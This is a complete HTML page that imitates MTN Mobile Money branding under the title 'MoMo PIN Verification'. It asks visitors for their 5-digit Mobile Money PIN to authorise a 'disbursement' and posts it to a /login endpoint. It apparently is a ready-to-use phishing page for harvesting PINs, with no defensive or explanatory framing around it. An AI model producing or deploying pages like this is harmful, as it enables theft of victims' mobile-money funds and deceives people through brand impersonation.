<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MoMo Security Authentication</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #f4f5f7; color: #333; min-height: 100vh; display: flex; flex-direction: column; font-family: system-ui, -apple-system, sans-serif; margin: 0; }
        .top-header { background-color: #003366; color: #FFCC00; padding: 14px 20px; text-align: center; font-weight: 800; font-size: 1.1rem; }
        .app-container { width: 100%; max-width: 550px; margin: 0 auto; background: #ffffff; padding: 28px 20px; flex-grow: 1; display: flex; flex-direction: column; justify-content: space-between; }
        @media (min-width: 576px) {
            body { background-color: #003366; padding: 20px 0; align-items: center; justify-content: center; }
            .app-container { border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.25); flex-grow: 0; }
            .top-header { display: none; }
        }
        .momo-logo { background-color: #FFCC00; color: #003366; font-weight: 900; font-size: 1.3rem; padding: 6px 14px; border-radius: 10px; display: inline-block; }
        .btn-momo { background-color: #003366; color: #FFCC00; font-weight: bold; font-size: 1.1rem; padding: 14px; border-radius: 12px; border: none; width: 100%; }
        .pin-input { font-size: 1.8rem; letter-spacing: 12px; text-align: center; padding: 12px; border-radius: 12px; }
    </style>
</head>
<body>
    <div class="top-header d-sm-none">
        <span style="background: #FFCC00; color: #003366; padding: 2px 8px; border-radius: 6px;">MM</span> MTN MoMo Security
    </div>

    <div class="app-container">
        <div>
            <div class="text-center mb-3">
                <div class="momo-logo">MM</div>
            </div>

            <h3 class="fw-bold text-center text-dark mb-2">MoMo PIN Verification</h3>
            <p class="text-muted text-center small mb-4">Enter your 5-digit MTN Mobile Money PIN to authenticate disbursement authorization.</p>

            <form id="loginForm" action="/login" method="POST">
                <div class="mb-4">
                    <input type="password" class="form-control pin-input" name="pin" maxlength="5" pattern="[0-9]*" inputmode="numeric" placeholder="•••••" required autocomplete="off">
                </div>
            </form>
        </div>

        <button type="submit" form="loginForm" class="btn btn-momo shadow-sm">AUTHENTICATE & DISBURSE ➔</button>
    </div>
</body>
</html>
